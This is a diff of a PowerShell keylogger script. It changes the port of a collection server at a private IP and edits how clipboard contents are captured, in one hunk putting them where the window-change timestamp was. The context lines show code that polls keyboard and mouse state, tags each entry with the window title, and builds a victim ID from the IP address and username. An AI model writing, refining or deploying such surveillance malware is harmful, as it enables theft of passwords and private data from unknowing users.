@@ -1,5 +1,5 @@
 
-$server = 'http://192.168.1.41:8080/'
+$server = 'http://192.168.1.41:9090/'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
@@ -126,7 +126,7 @@ while ($true) {
 			$DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
 			$LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
 			$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
-               $clipboard    = (get-clipboard)
+
 			if ($LeftShift -or $RightShift) {$Outout += '[Shift]'}
 			if ($LeftCtrl  -or $RightCtrl)  {$Outout += '[Ctrl]'}
 			if ($LeftAlt   -or $RightAlt)   {$Outout += '[Alt]'}
@@ -134,7 +134,7 @@ while ($true) {
 			if ($SpaceBar)     {$Outout += '[SpaceBar]'}
 			if ($DeleteKey)    {$Outout += '[Delete]'}
 			if ($EnterKey)     {$Outout += '[Enter]'}
-			if ($BackSpaceKey) {$Outout += '[$clipboard]'}
+			if ($BackSpaceKey) {$Outout += '[backspace]'}
 			if ($LeftArrow)    {$Outout += '[Left Arrow]'}
 			if ($RightArrow)   {$Outout += '[Right Arrow]'}
 			if ($UpArrow)      {$Outout += '[Up Arrow]'}
@@ -160,7 +160,7 @@ while ($true) {
 			if ($unicode_res -gt 0) {
 				if ($WindowTitle -ne $LastWindowTitle){
 					# if the window has changed
-					$TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
+					$TimeStamp = (get-clipboard)
 					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
